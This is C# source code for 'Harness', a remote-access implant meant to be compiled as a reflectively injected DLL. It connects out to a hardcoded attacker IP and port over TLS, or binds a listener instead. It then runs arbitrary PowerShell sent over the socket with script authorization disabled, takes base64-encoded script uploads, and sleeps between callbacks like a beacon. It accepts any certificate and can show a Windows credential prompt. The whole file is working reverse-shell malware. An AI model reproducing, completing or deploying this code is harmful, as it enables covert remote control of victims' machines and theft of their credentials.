/*
 *      Copyright (c) 2015, Rich Kelley
 *      
 *      Name:  Harness
 *      
 *      Description: Harness provides a remote PowerShell interface to virtually any TCP socket.
 *                   When compiled as a reflective dll use the HARNESS_DLL directive which will replace Main with InvokePS
 *                   
 *                  ReflectiveHarness draws heavily from the following projects, and otherwise would not have been possible:
 *                  https://github.com/leechristensen/UnmanagedPowerShell/tree/master/UnmanagedPowerShell
 *                  https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerPick/ReflectivePick
 *                  https://github.com/stephenfewer/ReflectiveDLLInjection
 *      
 *      Contact: @RGKelley5
 *               rk5devmail.com
 *               frogstarworldc.com
 *               
 *      License: MIT
 *      
 */

#define HARNESS_DLL
#define HARNESS_SSL
namespace Harness
{

    using System;
    using System.Text;
    using System.IO;
    using System.Net;
    using System.Net.Sockets;
    using System.Diagnostics;
    using System.Threading;
    using System.Text.RegularExpressions;
    using System.Collections.ObjectModel;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    using PowerShell = System.Management.Automation.PowerShell;
    using PSObject = System.Management.Automation.PSObject;
    using System.Collections.Generic;
    using System.Management.Automation.Host;
    using System.Net.Security;
    using System.Security.Cryptography.X509Certificates;
    using System.Runtime.InteropServices;
    using System.Security;
    using System.Security.Permissions;
    

    public class Harness
    {

#if HARNESS_SSL
        private bool SECURE = true;
#else
        private bool SECURE = false;
#endif

        public CustomStream stream;
        private TcpClient client;
        private int sleep;
        private bool FORMAT = true;
        public byte[] remoteIP_bytes = { 123, 456, 789, 123 };
        public byte[] localIP_bytes = { 0, 0, 0, 0 };
        public int remotePort = 9999;
        public int localPort = 8000;
        private bool shouldExit;
        private int exitCode;
        private CustomPSHost host;
        private Runspace myRunSpace;
        private PowerShell ps;
        InitialSessionState state;

        private Harness()
        {

            this.sleep = 0;
            this.host = new CustomPSHost(this);
            this.state = InitialSessionState.CreateDefault();
            this.state.AuthorizationManager = null;
            this.myRunSpace = RunspaceFactory.CreateRunspace(this.host, this.state);
            this.myRunSpace.ThreadOptions = PSThreadOptions.UseCurrentThread;
            this.myRunSpace.Open();
            this.ps = PowerShell.Create();
            this.ps.Runspace = this.myRunSpace;

        }

        public bool ShouldExit
        {
            get { return this.shouldExit; }
            set { this.shouldExit = value; }
        }

        public int ExitCode
        {
            get { return this.exitCode; }
            set { this.exitCode = value; }
        }



#if HARNESS_DLL

        public static string InvokePS(string arg)
#else
        private static void Main(string[] args)

#endif
        {

            Harness hcon = new Harness();

            do
            {

                hcon.Run();
                Thread.Sleep(hcon.sleep);

            } while (hcon.sleep > 0);

            hcon.CleanUp();

#if HARNESS_DLL

            return " ";
#endif
        }

        private void Run()
        {


            Debug.WriteLine("[DEBUG] Starting handler");

            // Define some helpful triggers and flags
            char HARNESS_CMD_CHAR = '^';
            string BEGINFILE_TAG = "<rf>";
            string ENDFILE_TAG = "</rf>";
            string USER_BREAK = "end";
            bool MULTILINE_FLAG = false;
            bool REMOTEFILE_FLAG = false;

            // Buffer for reading data 
            byte[] bytes;
            
            // Holds string representation of data send over the wire
            string data = "";

            // Used to accumulate data from imported file
            string data_chunk = "";
            
            // Replace ReverseShell() with BindShell() as needed
            this.client = ReverseShell();

            this.stream = new CustomStream(this, this.client, this.SECURE);

            while (!this.ShouldExit)
            {
                    
                if (this.stream.CanRead())
                {
                        
                    bytes = new byte[client.ReceiveBufferSize];

                    int i;
                    // Loop to receive all the data sent by the client.
                    while ((i = this.stream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        // Deal with multiline script by prompting for more input (e.g. >>)
                        if (MULTILINE_FLAG)
                        {

                            data_chunk = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();

                            // Check to see if the user wants to break out of multiline
                            if (data_chunk == HARNESS_CMD_CHAR + USER_BREAK)
                            {

                                ProcessPS(data);
                                MULTILINE_FLAG = false;
                                data = "";
                            }
                            else
                            {
                                data += data_chunk;
                            }

                        }
                        else if (REMOTEFILE_FLAG)
                        {
                            // Need to check and see if the script is done transfering
                            data_chunk = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();

                            if (data_chunk.ToLower() == ENDFILE_TAG)
                            {

                                Debug.WriteLine("[DEBUG] File received");

                                data = Encoding.UTF8.GetString(Convert.FromBase64String(data));
                                if (IsValid(data))
                                {
                                    ProcessPS(data);
                                }
                                else
                                {
                                    this.host.UI.WriteLine("[!] Transfer errors found. Try import again");
                                }

                                data = "";
                                REMOTEFILE_FLAG = false;
                            }
                            else
                            {
                                data += data_chunk;
                                data_chunk = "";
                            }

                        }
                        else
                        {

                            data = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();

                            if (data.ToLower() == "exit" || data.ToLower() == "quit")
                            {
                                this.sleep = 0;
                                break;
                            }    
                                   

                            if (data.ToLower() == BEGINFILE_TAG)
                            {

                                Debug.WriteLine("[DEBUG] Receiving File");

                                REMOTEFILE_FLAG = true;
                                data = "";
                            }

                            if (!string.IsNullOrEmpty(data) && !REMOTEFILE_FLAG)
                            {

                                Debug.WriteLine("[DEBUG] Command Received: " + data.ToString());

                                // ProcessLocal is reserved for non-PS Harness commands that require special handling
                                if (data[0] == HARNESS_CMD_CHAR)
                                {

                                    if (!ProcessLocal(data))
                                    {
                                        break;
                                    }
                                           
                                    data = "";

                                }

                            }
                        }

                        // Determine how we deal with the data received
                        if (!REMOTEFILE_FLAG)
                        {
                            if (IsValid(data))
                            {

                                ProcessPS(data);
                                data = "";
                                MULTILINE_FLAG = false;

                            }
                            else
                            {

                                Debug.WriteLine("[DEBUG] Incomplete script or parse error");
                                MULTILINE_FLAG = true;
                                this.host.UI.Write(">> ");

                            }

                        }

                    }

                    // Shutdown and end connection
                    client.Close();

                    Debug.WriteLine("[DEBUG] Connection Closed");

                    break;
                }

            }
        
        }

        private void CleanUp()
        {

            this.myRunSpace.Dispose();
            this.ps.Dispose();
        }

        private TcpClient ReverseShell()
        {

            Debug.WriteLine("[DEBUG] InReverseShell");


            TcpClient client = new TcpClient();
             
            try
            {

                IPAddress IP = new IPAddress(this.remoteIP_bytes);
                client.Connect(IP, this.remotePort);
                
            }
            catch (Exception err)
            {

                Debug.WriteLine("[ERROR] Connection failed!");

                System.Environment.Exit(1);

            }

            return client;
            
        }

        private TcpClient BindShell()
        {

            Debug.WriteLine("[DEBUG] In BindShell");

            // Create TcpListener
            IPAddress localAddr = new IPAddress(this.localIP_bytes);
            TcpListener server = new TcpListener(localAddr, this.localPort);

            // Start listening for client requests.
            server.Start();

            //perform a blocking call to accept requests.
            TcpClient client = null;

            try
            {

                client = server.AcceptTcpClient();
                return client;
            }
            catch (Exception err)
            {

                Debug.WriteLine("[ERROR] Bind failed!");
                Debug.WriteLine(err.ToString());

                System.Environment.Exit(1);
            }

            return client;
        }

        private Boolean IsValid(String data)
        {

            Debug.WriteLine("[DEBUG] In IsValid");


            Collection<PSParseError> errors = new Collection<PSParseError>();
            Collection<PSToken> tokens = PSParser.Tokenize(data, out errors);

            if (errors.Count > 0)
            {

                return false;
            }

            return true;
        }

        private bool ProcessLocal(String cmd)
        {

            Debug.WriteLine("[DEBUG] In ProcessLocal");
            Debug.WriteLine(cmd);
            String results = "";
            bool rtn = true;

            
            cmd = cmd.Substring(1, cmd.Length - 1);
            cmd = cmd.ToLower().TrimEnd(' ');

            string[] tokens = cmd.Split(' ');
            switch (tokens[0])
            {

                case "enable-format":

                    FORMAT = true;
                    results = "[+] Formatting added";
                    break;

                case "disable-format":

                    FORMAT = false;
                    results = "[-] Formatting removed";
                    break;

                case "sleep":

                    DateTime now = DateTime.Now;
                    DateTime dts;
                    TimeSpan t;
                    DateTime nextcallback;
                    string _token = "UNDEFINED";

                    if (tokens.Length == 2)
                    {
                        

                        if (tokens[1][0] == '+')
                        {

                            
                            switch (tokens[1][tokens[1].Length-1])
                            {

                                case 'd':
                                    double days;

                                    if(double.TryParse(tokens[1].Substring(1, tokens[1].Length - 2), out days))
                                    {

                                        _token = DateTime.Now.AddDays(days).ToString();

                                    }
    
                                    break;

                                case 'h':

                                    double hours;

                                    if(double.TryParse(tokens[1].Substring(1, tokens[1].Length - 2), out hours))
                                    {

                                        _token = DateTime.Now.AddHours(hours).ToString();

                                    }

                                    break;

                                case 'm':

                                    double minutes;

                                    
                                    if(double.TryParse(tokens[1].Substring(1, tokens[1].Length - 2), out minutes))
                                    {

                                        _token = DateTime.Now.AddMinutes(minutes).ToString();

                                    }

                                    break;

                                case 's':

                                    double seconds;

                                    if(double.TryParse(tokens[1].Substring(1, tokens[1].Length - 2), out seconds))
                                    {

                                        _token = DateTime.Now.AddSeconds(seconds).ToString();

                                    }
                                    break;

                            }
                        }
                        else
                        {
                            _token = tokens[1];
                        }
                        
                    }
                    else if (tokens.Length == 3)
                    {
                        _token = tokens[1] + " " + tokens[2];
                    } 

                    if (DateTime.TryParse(_token, out dts))
                    {
                        
                        TimeSpan diff = dts - now;

                        if (diff.TotalMilliseconds < 0)
                        {
                            diff = diff.Add(TimeSpan.FromHours(24));
                        }

                        double diff_in_milli = diff.TotalMilliseconds;
                        t = TimeSpan.FromMilliseconds(diff_in_milli);

                        nextcallback = now.AddMilliseconds(diff_in_milli);
                        results = t.ToString();
                        results = "[+] Sleeping for " + results + ", next callback at " + nextcallback.ToString();

                        this.sleep = (int)diff.TotalMilliseconds;
                        rtn = false;
                    }
                    else
                    {
                        results = "[-] Invalid sleep parameter " + _token.ToString();
                    }
                                    
                    break;

            }


            this.host.UI.Write(results + "\r\n");
            return rtn;
        }

        private void ProcessPS(String data)
        {

            Debug.WriteLine("[DEBUG] -------------Data Received---------------");
            Debug.WriteLine(data);
            Debug.WriteLine("[DEBUG] -------------End Data Received-----------");

            if (!String.IsNullOrEmpty(data))
            {

                this.ps.AddScript(data);

                // If for some reason you do not want out-string appended to the pipeline use ^disable-format command
                if (this.FORMAT)
                {
                    this.ps.AddCommand("Out-String");
                }
                
                Debug.WriteLine("Invoking...");

                PSDataCollection<PSObject> PSOutput = new PSDataCollection<PSObject>();
                PSOutput.DataAdded += PSOutput_DataAdded;

                // Warning, Debug, and Verbose streams invoke PSHostUserInterface methods accordingly, 
                // but the Error stream does not. I have no idea why and the documentation is limited.
                // To solve this problem an event handler is added to trigger when errors are created.
                this.ps.Streams.Error.DataAdded += Error_DataAdded;

                IAsyncResult async = this.ps.BeginInvoke<PSObject, PSObject>(null, PSOutput);
                while (async.IsCompleted == false)
                {
                    // not much difference between ps.Invoke(). Could be used for future feature of background jobs
                    // or possibly send status reports about the scripts progress
                }

            }

            String PSpath = ps.Runspace.SessionStateProxy.Path.CurrentFileSystemLocation.ToString();
            this.host.UI.Write("PS " + PSpath + "> ");

            ps.Commands.Clear();

        }

        private void PSOutput_DataAdded(object sender, DataAddedEventArgs e)
        {

            Debug.WriteLine("[DEBUG] New Results Added");

            PSDataCollection<PSObject> myp = (PSDataCollection<PSObject>)sender;

            Collection<PSObject> results = myp.ReadAll();
            foreach (PSObject result in results)
            {

               this.host.UI.WriteLine(result.ToString());
             
            }

        }

        private void Error_DataAdded(object sender, DataAddedEventArgs e)
        {

            Debug.WriteLine("[DEBUG] New Error Added");

            Collection<ErrorRecord> errors = this.ps.Streams.Error.ReadAll();

            Debug.WriteLine("[DEBUG] Clearing Errors");
            this.ps.Streams.Error.Clear();
            foreach (var errRecord in errors)
            {

                this.host.UI.WriteErrorLine(errRecord.ToString());


            }

        }

        class CustomPSHost : PSHost
        {
            private Harness program;
            private Guid _hostId = Guid.NewGuid();
            private CustomPSHostUserInterface _ui;


            public CustomPSHost(Harness program)
            {
                this.program = program;
                this._ui = new CustomPSHostUserInterface(this.program);
            }

            public override Guid InstanceId
            {
                get { return this._hostId; }
            }

            public override string Name
            {
                get { return "Harness"; }
            }

            public override Version Version
            {
                get { return new Version(1, 0); }
            }

            public override PSHostUserInterface UI
            {
                get { return this._ui; }
            }


            public override System.Globalization.CultureInfo CurrentCulture
            {
                get { return Thread.CurrentThread.CurrentCulture; }
            }

            public override System.Globalization.CultureInfo CurrentUICulture
            {
                get { return Thread.CurrentThread.CurrentUICulture; }
            }

            public override void EnterNestedPrompt()
            {
                throw new NotImplementedException("EnterNestedPrompt is not implemented.  ");
            }

            public override void ExitNestedPrompt()
            {
                throw new NotImplementedException("ExitNestedPrompt is not implemented. ");
            }

            public override void NotifyBeginApplication()
            {
                return;
            }

            public override void NotifyEndApplication()
            {
                return;
            }

            public override void SetShouldExit(int exitCode)
            {
                this.program.ShouldExit = true;
                this.program.ExitCode = exitCode;
                return;
            }
        }

        class CustomPSHostUserInterface : PSHostUserInterface
        {
            
            private Harness program;
            private CustomPSRHostRawUserInterface _rawUi = new CustomPSRHostRawUserInterface();

            public CustomPSHostUserInterface(Harness program)
            {
                this.program = program;
                
            }

            private void SendOutput(String output)
            {

                if (this.program.stream.CanWrite())
                {

                    Debug.WriteLine("[DEBUG] Sending: " + output.ToString());

                    Byte[] outputBytes = Encoding.UTF8.GetBytes(output.ToString());
                    this.program.stream.Write(outputBytes, 0, outputBytes.Length);

                }

            }

            public override void WriteLine()
            {
                Debug.WriteLine("[DEBUG] WriteLine() called");
                this.SendOutput("\n");              
            }

            public override void WriteLine(String value)
            {
                Debug.WriteLine("[DEBUG] WriteLine(String) called");
                this.SendOutput(value);
            }

            public override void WriteLine(ConsoleColor foregroundColor, ConsoleColor backgroundColor, String value)
            {
                Debug.WriteLine("[DEBUG] WriteLine(consolecoler, consolecolor, string) called");
                this.SendOutput(value + "\n");             
            }

            public override void Write(ConsoleColor foregroundColor, ConsoleColor backgroundColor, String value)
            {
                Debug.WriteLine("[DEBUG] Write(consolecoler, consolecolor, string) called");
                this.SendOutput(value);
            }

            public override void Write(String value)
            {
                Debug.WriteLine("[DEBUG] Write(string) called");
                this.SendOutput(value);             
            }


            public override void WriteDebugLine(String value)
            {
                Debug.WriteLine("[DEBUG] WriteDebugLine(string) called");
                this.SendOutput("DEBUG: " + value + "\n");           
            }

            public override void WriteErrorLine(String value)
            {
                Debug.WriteLine("[DEBUG] WriteErrorLine(string) called");
                this.SendOutput("ERROR: " + value + "\n");                
            }

            public override void WriteVerboseLine(String message)
            {
                Debug.WriteLine("[DEBUG] WriteVerboseLine(string) called");
                this.SendOutput("VERBOSE: " + message + "\n");                
            }

            public override void WriteWarningLine(String message)
            {
                Debug.WriteLine("[DEBUG] WriteWarningLine(string) called");
                this.SendOutput("WARNING: " + message + "\n");
            }

            public override void WriteProgress(long sourceId, ProgressRecord record)
            {
                return;
            }

            public string Output
            {
                get { return " ";}
            }

            public override Dictionary<string, PSObject> Prompt(string caption, string message, System.Collections.ObjectModel.Collection<FieldDescription> descriptions)
            {

                this.Write(caption + "\n" + message + " ");
                Dictionary<string, PSObject> results = new Dictionary<string, PSObject>();

                foreach (FieldDescription fd in descriptions)
                {
                    string[] label = GetHotkeyAndLabel(fd.Label);
                    this.WriteLine(label[1]);

                    string data = this.ReadLine();

                    if (data == null)
                    {
                        return null;
                    }

                    results[fd.Name] = PSObject.AsPSObject(data);
                }

                return results;

            }

            // Ripped and modified from MSDN example
            public override int PromptForChoice(string caption, string message, System.Collections.ObjectModel.Collection<ChoiceDescription> choices, int defaultChoice)
            {
                
                this.WriteLine(caption + "\n" + message + "\n");
                string[,] promptData = BuildHotkeysAndPlainLabels(choices);
                // Format the overall choice prompt string to display.
                StringBuilder sb = new StringBuilder();

                for (int element = 0; element < choices.Count; element++)
                {
                    sb.Append(String.Format("[{0}] {1} ", promptData[0, element], promptData[1, element]));
                }

                sb.Append(String.Format("(Default is {0})", promptData[0, defaultChoice]));

                // Read prompts until a match is made, the default is
                // chosen, or the loop is interrupted with ctrl-C.            
                while (true)
                {

                    this.WriteLine(sb.ToString());

                    string data = this.ReadLine();

                    // If the choice string was empty, use the default selection.
                    if (string.IsNullOrEmpty(data))
                    {
                        return defaultChoice;
                    }

                    // See if the selection matched and return the
                    // corresponding index if it did.
                    for (int j = 0; j < choices.Count; j++)
                    {
                        if (promptData[0, j] == data)
                        {
                            return j;
                        }
                    }

                    this.WriteErrorLine("Invalid choice: " + data);

                    
                }
                 
            }

            // Modified from MSDN example
            private static string[] GetHotkeyAndLabel(string input)
            {
                string[] result = new string[] { String.Empty, String.Empty };
                string[] fragments = input.Split('&');
                if (fragments.Length == 2)
                {
                    if (fragments[1].Length > 0)
                    {
                        result[0] = fragments[1][0].ToString();
                        
                    }

                    result[1] = (fragments[0] + fragments[1]).Trim();
                }
                else
                {
                    result[1] = input;
                }

                return result;
            }

            // Modified from MSDN example
            private static string[,] BuildHotkeysAndPlainLabels(Collection<ChoiceDescription> choices)
            {
                // Allocate the result array
                string[,] hotkeysAndPlainLabels = new string[2, choices.Count];

                for (int i = 0; i < choices.Count; ++i)
                {
                    string[] hotkeyAndLabel = GetHotkeyAndLabel(choices[i].Label);
                    hotkeysAndPlainLabels[0, i] = hotkeyAndLabel[0];
                    hotkeysAndPlainLabels[1, i] = hotkeyAndLabel[1];
                }

                return hotkeysAndPlainLabels;
            }


            [DllImport("ole32.dll")]
            public static extern void CoTaskMemFree(IntPtr ptr);

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
            private struct CREDUI_INFO
            {
                public int cbSize;
                public IntPtr hwndParent;
                public string pszMessageText;
                public string pszCaptionText;
                public IntPtr hbmBanner;
            }


            [DllImport("credui.dll", CharSet = CharSet.Auto)]
            private static extern bool CredUnPackAuthenticationBuffer(int dwFlags,
                                                                       IntPtr pAuthBuffer,
                                                                       uint cbAuthBuffer,
                                                                       StringBuilder pszUserName,
                                                                       ref int pcchMaxUserName,
                                                                       StringBuilder pszDomainName,
                                                                       ref int pcchMaxDomainame,
                                                                       StringBuilder pszPassword,
                                                                       ref int pcchMaxPassword);

            [DllImport("credui.dll", CharSet = CharSet.Auto)]
            private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,
                                                                         int authError,
                                                                         ref uint authPackage,
                                                                         IntPtr InAuthBuffer,
                                                                         uint InAuthBufferSize,
                                                                         out IntPtr refOutAuthBuffer,
                                                                         out uint refOutAuthBufferSize,
                                                                         ref bool fSave,
                                                                         int flags);

            [DllImport("credui.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern Boolean CredPackAuthenticationBuffer(int dwFlags,
                                                                      string pszUserName,
                                                                      string pszPassword,
                                                                      IntPtr pPackedCredentials,
                                                                      ref int pcbPackedCredentials);


            // Adapated from http://stackoverflow.com/questions/4134882/show-authentication-dialog-in-c-sharp-for-windows-vista-7
            // NOTE: This function is not fully realized yet, but should allow for prompting the users for credentials (e.g. get-credentials)
            //       This has not been fully tested on a funtioning domain yet. Please report bugs; especially for Kerberos implementations
            public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName)
            {

                Debug.WriteLine("caption: " + caption + "\nmessage: " + message + "\nuserName: " + userName + "\ntarget: " + targetName);
                CREDUI_INFO credui = new CREDUI_INFO();
                credui.pszCaptionText = caption;
                credui.pszMessageText = message;
                credui.hwndParent = IntPtr.Zero;
                credui.cbSize = Marshal.SizeOf(credui);
                uint authPackage = 0;
                IntPtr outCredBuffer = new IntPtr();
                uint outCredSize = 1024;
                bool save = false;

                String domain = "null_domain";
                //String _password = "test";
                SecureString password = new SecureString();
                PSCredential creds;

                // NOTE: The following 3 lines were an attempt to get the login prompt to fill-in user specified values
                //       this is still a work in progress.
                // int inCredSize = 1024;
                // IntPtr inCredBuffer = Marshal.AllocCoTaskMem(inCredSize);
                // CredPackAuthenticationBuffer(0, userName, _password, inCredBuffer, ref inCredSize);

                int result = CredUIPromptForWindowsCredentials(ref credui,
                                                               0,
                                                               ref authPackage,
                                                               IntPtr.Zero,         // inCredBuffer
                                                               0,
                                                               out outCredBuffer,
                                                               out outCredSize,
                                                               ref save,
                                                               0x1);

                var usernameBuf = new StringBuilder(100);
                var passwordBuf = new StringBuilder(100);
                var domainBuf = new StringBuilder(100);

                int maxUserName = 100;
                int maxDomain = 100;
                int maxPassword = 100;
                if (result == 0)
                {
                    // Convert authentication buffer returned by CredUnPackAuthenticationBuffer to string username and password
                    if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,
                                                       domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
                    {

                        //clear the memory allocated by CredUIPromptForWindowsCredentials 
                        CoTaskMemFree(outCredBuffer);

                        domain = domainBuf.ToString();

                        if (!string.IsNullOrEmpty(userName))
                        {
                            userName = domain + "/" + usernameBuf.ToString();
                        }
                        else
                        {
                            userName = usernameBuf.ToString();
                        }
                        
                        Array.ForEach(passwordBuf.ToString().ToCharArray(), password.AppendChar); // May leave cleartext in memory :/
                        password.MakeReadOnly();
                        
                        creds = new PSCredential(userName, password);

                    }
                    else
                    {
                        creds = new PSCredential(userName, password);
                    }

                }
                else
                {
                    creds = new PSCredential(userName, password);
                }

                return creds;

            }


            public override PSCredential PromptForCredential(string caption, string message, string userName, string targetName, PSCredentialTypes allowedCredentialTypes, PSCredentialUIOptions options)
            {
                return this.PromptForCredential(caption, message, userName, targetName);
            }

            
            public override PSHostRawUserInterface RawUI
            {
                get { return this._rawUi; }
            }

            public override string ReadLine()
            {
                int i;
                byte[] bytes = new byte[this.program.client.ReceiveBufferSize];
                string data = "";

                // Loop to receive all the data sent by the client.
                while ((i = this.program.stream.Read(bytes, 0, bytes.Length)) != 0)
                {

                    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i).Trim();
                    break;
                }

                return data;
            }

            public override System.Security.SecureString ReadLineAsSecureString()
            {
                throw new NotImplementedException("ReadLineAsSecureString is not implemented.");
            }
        }

        class CustomPSRHostRawUserInterface : PSHostRawUserInterface
        {

            private Size _windowSize = new Size { Width = 120, Height = 100 };

            private Coordinates _cursorPosition = new Coordinates { X = 0, Y = 0 };

            private int _cursorSize = 1;
            private ConsoleColor _foregroundColor = ConsoleColor.White;
            private ConsoleColor _backgroundColor = ConsoleColor.Black;

            private Size _maxPhysicalWindowSize = new Size
            {
                Width = int.MaxValue,
                Height = int.MaxValue
            };

            private Size _maxWindowSize = new Size { Width = 100, Height = 100 };
            private Size _bufferSize = new Size { Width = 100, Height = 1000 };
            private Coordinates _windowPosition = new Coordinates { X = 0, Y = 0 };
            private String _windowTitle = " ";

            public override ConsoleColor BackgroundColor
            {
                get { return _backgroundColor; }
                set { _backgroundColor = value; }
            }

            public override Size BufferSize
            {
                get { return _bufferSize; }
                set { _bufferSize = value; }
            }

            public override Coordinates CursorPosition
            {
                get { return _cursorPosition; }
                set { _cursorPosition = value; }
            }

            public override int CursorSize
            {
                get { return _cursorSize; }
                set { _cursorSize = value; }
            }

            public override void FlushInputBuffer()
            {
                throw new NotImplementedException("FlushInputBuffer is not implemented.");
            }

            public override ConsoleColor ForegroundColor
            {
                get { return _foregroundColor; }
                set { _foregroundColor = value; }
            }

            public override BufferCell[,] GetBufferContents(Rectangle rectangle)
            {

                throw new NotImplementedException("GetBufferContents is not implemented.");
            }

            public override bool KeyAvailable
            {
                get { throw new NotImplementedException("KeyAvailable is not implemented."); }
            }

            public override Size MaxPhysicalWindowSize
            {
                get { return _maxPhysicalWindowSize; }
            }

            public override Size MaxWindowSize
            {
                get { return _maxWindowSize; }
            }

            public override KeyInfo ReadKey(ReadKeyOptions options)
            {
                throw new NotImplementedException("ReadKey is not implemented.");
            }

            public override void ScrollBufferContents(Rectangle source, Coordinates destination, Rectangle clip, BufferCell fill)
            {
                throw new NotImplementedException("ScrollBufferContents is not implemented");
            }

            public override void SetBufferContents(Rectangle rectangle, BufferCell fill)
            {
                throw new NotImplementedException("SetBufferContents is not implemented.");
            }

            public override void SetBufferContents(Coordinates origin, BufferCell[,] contents)
            {
                throw new NotImplementedException("SetBufferContents is not implemented");
            }

            public override Coordinates WindowPosition
            {
                get { return _windowPosition; }
                set { _windowPosition = value; }
            }

            public override Size WindowSize
            {
                get { return _windowSize; }
                set { _windowSize = value; }
            }

            public override string WindowTitle
            {
                get { return _windowTitle; }
                set { _windowTitle = value; }
            }
        }

    }

    public class CustomStream
    {

        private NetworkStream clear_stream;
        private SslStream secure_stream;
        private bool SECURE;
        private Harness program;

        public CustomStream(Harness program, TcpClient client, bool SECURE)
        {

            if (SECURE)
            {
                this.secure_stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null);
                this.program = program;
                this.secure_stream.AuthenticateAsClient(BytesToIPv4String(this.program.remoteIP_bytes));
                this.SECURE = true;
            }
            else
            {
                this.clear_stream = client.GetStream();
                this.SECURE = false;
            }

        }

        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {

            return true; // Sure the cert is valid
        }

        private string BytesToIPv4String(byte[] barray)
        {

            string IP = "";
            for (int i = 0; i < barray.Length; i++)
            {
                IP += barray[i].ToString();

                if (i != barray.Length - 1)
                {

                    IP += ".";
                }
            }

            return IP;
        }

        public bool CanRead()
        {
            if (this.SECURE)
            {

                return this.secure_stream.CanRead;

            }
            else
            {
                return this.clear_stream.CanRead;
            }

        }

        public bool CanWrite()
        {
            if (this.SECURE)
            {

                return this.secure_stream.CanWrite;

            }
            else
            {
                return this.clear_stream.CanWrite;
            }

        }

        public int Read(byte[] bytes, int x, int Length)
        {

            if (this.SECURE)
            {
                return this.secure_stream.Read(bytes, x, bytes.Length);
            }
            else
            {
                return this.clear_stream.Read(bytes, x, bytes.Length);
            }

        }

        public void Write(Byte[] outputBytes, int x, int Length)
        {

            if (this.SECURE)
            {
                this.secure_stream.Write(outputBytes, x, outputBytes.Length);
            }
            else
            {
                this.clear_stream.Write(outputBytes, x, outputBytes.Length);
            }

        }

    }

    
}


